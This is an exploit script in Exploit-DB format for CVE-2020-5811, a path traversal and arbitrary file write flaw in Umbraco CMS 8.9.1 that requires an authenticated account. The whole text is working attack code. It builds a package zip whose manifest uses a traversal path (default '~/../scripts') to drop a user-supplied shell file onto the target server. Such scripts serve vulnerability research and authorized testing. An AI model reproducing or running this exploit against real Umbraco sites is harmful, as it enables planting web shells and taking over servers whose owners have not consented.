# Exploit Title: Umbraco CMS 8.9.1 - Path traversal and Arbitrary File Write (Authenticated)
# Exploit Author: BitTheByte
# Description: Authenticated path traversal vulnerability.
# Exploit Research: https://www.tenable.com/security/research/tra-2020-59
# Vendor Homepage: https://umbraco.com/
# Version: <= 8.9.1
# CVE : CVE-2020-5811

import string
import random
import argparse
import zipfile
import os

package_xml = f"""<?xml version="1.0" encoding="utf-8"?>
<umbPackage>
  <files>
    <file>
      <guid>{{filename}}</guid>
      <orgPath>{{upload_path}}</orgPath>
      <orgName>{{filename}}</orgName>
    </file>
  </files>
  <info>
    <package>
      <name>PoC-{''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))}</name>
      <version>1.0.0</version>
      <iconUrl></iconUrl>
      <license url="http://opensource.org/licenses/MIT">MIT License</license>
      <url>https://example.com</url>
      <requirements>
        <major>0</major>
        <minor>0</minor>
        <patch>0</patch>
      </requirements>
    </package>
    <author>
      <name>CVE-2020-5811</name>
      <website>https://example.com</website>
    </author>
    <contributors>
      <contributor></contributor>
    </contributors>
    <readme><![CDATA[]]></readme>
  </info>
  <DocumentTypes />
  <Templates />
  <Stylesheets />
  <Macros />
  <DictionaryItems />
  <Languages />
  <DataTypes />
  <Actions />
</umbPackage>
"""

parser = argparse.ArgumentParser(description='CVE-2020-5811')
parser.add_argument('--shell', type=str, help='Shell file to upload', required=True)
parser.add_argument('--upload-path', type=str, help='Shell file update path on target server (default=~/../scripts)', default='~/../scripts')
args = parser.parse_args()

if not os.path.isfile(args.shell):
  print("[ERROR] please use a correct path for the shell file.")

output_file = "exploit.zip"

package = zipfile.ZipFile(output_file, 'w')
package.writestr('package.xml', package_xml.format(filename=os.path.basename(args.shell), upload_path=args.upload_path))
package.writestr(os.path.basename(args.shell), open(args.shell, 'r').read())
package.close()

print(f"[DONE] Created Umbraco package: {output_file}")